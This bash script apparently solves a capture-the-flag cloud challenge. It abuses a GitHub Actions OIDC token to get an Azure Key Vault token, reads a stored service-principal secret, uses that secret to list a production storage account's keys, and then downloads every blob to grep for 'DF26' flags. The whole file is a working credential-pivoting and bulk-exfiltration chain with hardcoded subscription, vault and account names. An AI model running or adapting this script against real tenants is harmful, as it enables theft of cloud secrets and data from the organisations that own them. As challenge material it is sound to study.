#!/usr/bin/env bash
set -uo pipefail
M="--max-time 30 --connect-timeout 10"
SUB=c5e4e004-b42d-4ac4-a502-5fd338380eb6
RG=rg-tbl-platform-prod-sea
ACC=sttblcilogsprodx3euoz
MGMT="https://management.azure.com"
PRODKV="https://kv-tbl-prod-x3euoz.vault.azure.net"

OIDC=$(curl -sS $M -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange" | jq -r '.value')
KV=$(curl -sS $M -X POST "https://login.microsoftonline.com/$AZURE_TENANT_ID/oauth2/v2.0/token" -d "client_id=$AZURE_CLIENT_ID" -d "scope=https://vault.azure.net/.default" -d "grant_type=client_credentials" -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" -d "client_assertion=$OIDC" | jq -r '.access_token // empty')
J=$(curl -sS $M -H "Authorization: Bearer $KV" "$PRODKV/secrets/sync-service-principal?api-version=7.4" | jq -r '.value')
appId=$(printf '%s' "$J" | jq -r '.appId // .clientId'); sec=$(printf '%s' "$J" | jq -r '.clientSecret // .password // .secret'); ten=$(printf '%s' "$J" | jq -r '.tenant // .tenantId // empty'); [ -z "$ten" ] && ten=$AZURE_TENANT_ID
SS=$(curl -sS $M -X POST "https://login.microsoftonline.com/$ten/oauth2/v2.0/token" -d "client_id=$appId" -d "client_secret=$sec" -d "scope=https://management.azure.com/.default" -d "grant_type=client_credentials" | jq -r '.access_token // empty')
echo "sync-service mgmt token len=${#SS}"

KEY=$(curl -sS $M -X POST -H "Authorization: Bearer $SS" -H "Content-Length: 0" "$MGMT/subscriptions/$SUB/resourceGroups/$RG/providers/Microsoft.Storage/storageAccounts/$ACC/listKeys?api-version=2023-01-01" | jq -r '.keys[0].value // empty')
echo "account key obtained: len=${#KEY}"
[ -z "$KEY" ] && { echo "NO KEY"; exit 0; }

az version -o tsv >/dev/null 2>&1 || echo "WARN: az missing"
export AZURE_STORAGE_AUTH_MODE=key
COMMON=(--account-name "$ACC" --account-key "$KEY" --only-show-errors -o tsv)

echo "===== blob containers ====="
CONTS=$(az storage container list "${COMMON[@]}" --query '[].name' 2>/dev/null)
echo "$CONTS"
echo "===== file shares ====="
az storage share list "${COMMON[@]}" --query '[].name' 2>/dev/null
echo "===== tables ====="
az storage table list "${COMMON[@]}" --query '[].name' 2>/dev/null
echo "===== queues ====="
az storage queue list "${COMMON[@]}" --query '[].name' 2>/dev/null

DL=/tmp/blobs; mkdir -p "$DL"
while IFS= read -r c; do
  [ -z "$c" ] && continue
  echo "----- container: $c -----"
  BLOBS=$(az storage blob list "${COMMON[@]}" -c "$c" --query '[].name' 2>/dev/null)
  echo "$BLOBS" | sed 's/^/   /' | head -80
  while IFS= read -r b; do
    [ -z "$b" ] && continue
    safe=$(printf '%s' "$c/$b" | tr '/ ' '__')
    az storage blob download "${COMMON[@]}" -c "$c" -n "$b" -f "$DL/$safe" >/dev/null 2>&1 || true
  done <<< "$BLOBS"
done <<< "$CONTS"

echo "===== grep DF26{ across all downloaded blobs ====="
grep -raoE "DF26\{[^}]*\}" "$DL" 2>/dev/null | sort -u || echo "(none in blob bodies)"
echo "===== blob names containing flag/df26 ====="
ls -1 "$DL" 2>/dev/null | grep -iE "flag|df26|secret" || true
echo "===== also grep for 'DF26' loosely (names/partials) ====="
grep -raoE "DF26[^ ]{0,80}" "$DL" 2>/dev/null | sort -u | head -20
echo "STORAGE DONE"; exit 0
